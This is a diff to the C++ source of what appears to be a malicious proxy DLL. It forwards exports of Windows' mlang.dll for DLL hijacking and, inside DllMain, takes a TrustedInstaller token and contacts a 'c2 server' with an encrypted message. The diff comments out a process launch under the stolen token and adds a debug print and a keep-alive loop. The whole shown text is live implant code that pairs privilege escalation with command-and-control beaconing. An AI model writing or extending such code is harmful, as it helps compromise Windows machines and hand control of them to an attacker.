@@ -4,6 +4,8 @@
 #include "../../Headers/client.h"
 #include "../../Headers/net_common.h"
 
+#include <thread>
+
 #pragma comment(linker, "/export:IsConvertINetStringAvailable=C:\\Windows\\System32\\mlang.IsConvertINetStringAvailable,@110")
 #pragma comment(linker, "/export:ConvertINetString=C:\\Windows\\System32\\mlang.ConvertINetString,@111")
 #pragma comment(linker, "/export:ConvertINetUnicodeToMultiByte=C:\\Windows\\System32\\mlang.ConvertINetUnicodeToMultiByte,@112")
@@ -53,17 +55,17 @@ BOOL APIENTRY DllMain(HMODULE hModule,
 
 		HANDLE token = ProcessUtilities::GetTrustedInstallerToken();
 
-		ProcessUtilities::OpenProcessAsImposter(
-			token,
-			LOGON_WITH_PROFILE,
-			NULL,
-			cmd.data(),
-			CREATE_NEW_CONSOLE,
-			NULL,
-			NULL,
-			&si,
-			&pi
-		);
+		//ProcessUtilities::OpenProcessAsImposter(
+		//	token,
+		//	LOGON_WITH_PROFILE,
+		//	NULL,
+		//	cmd.data(),
+		//	CREATE_NEW_CONSOLE,
+		//	NULL,
+		//	NULL,
+		//	&si,
+		//	&pi
+		//);
 
 		// try to connect to c2 server
 		Client me;
@@ -75,6 +77,12 @@ BOOL APIENTRY DllMain(HMODULE hModule,
 		req.tcp = me.GetTCPSocket();
 		req.valid = TRUE;
 		me.TCPSendEncryptedMessageToServer(req);
+
+		OutputDebugStringA("sent the encrypted msg");
+
+		while ( 1 ) {
+			std::this_thread::sleep_for(std::chrono::seconds(1)); // Simple wait to keep the main thread alive
+		}
 
 		ProcessUtilities::Clean();
 
